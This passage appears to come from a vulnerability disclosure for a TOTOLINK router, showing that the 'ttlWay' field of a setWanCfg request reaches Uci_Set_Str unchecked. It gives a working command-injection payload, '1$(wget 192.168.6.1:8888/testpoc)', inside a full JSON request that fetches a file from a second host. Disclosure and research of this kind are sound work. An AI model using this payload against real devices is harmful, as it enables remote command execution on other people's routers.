...
<div  align="center"><img src="./img/ttl-way-sub_422380.png" style="zoom:80%;" /></div>

The sub_422380 function defines a variable `ttlWay`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.
...
We set `ttlWay` as **1$(wget 192.168.6.1:8888/testpoc)** ,such as:
...
{"hostName":"TOTOLINK","dhcpMtu":"1500","proto":1,"dnsMode":"0","ttlWay":"1$(wget 192.168.6.1:8888/testpoc)","lcpEchoEnable":"1","option60Enable":"0","clone":"0","cloneMac":"40:EE:15:D4:88:6D","topicurl":"setWanCfg"}
```

## outcome
<div  align="center"><img src="./img/poc-ttl-way.png" style="zoom:80%;" /></div>